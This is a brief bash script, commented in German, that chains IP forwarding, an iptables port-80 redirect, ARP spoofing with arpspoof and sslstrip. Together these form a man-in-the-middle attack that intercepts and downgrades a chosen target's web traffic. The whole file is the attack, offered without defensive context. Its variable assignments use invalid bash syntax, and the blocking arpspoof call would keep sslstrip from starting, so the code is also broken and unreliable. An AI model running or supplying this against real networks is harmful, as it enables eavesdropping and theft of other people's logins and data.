#!/bin/bash

#routing aktivieren
echo 1 > /proc/sys/net/ipv4/ip_forward

#Nat konfigurieren
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

Router_IP = $(read -p "Router IP?")

Target_IP = $(read -p "Target IP?")
#arpspoofing aktivieren
arpspoof -i eth0 -r -t $Router_IP $Target_IP

#arpspoofing mit ssl strip kombinieren
sslstrip -l 8080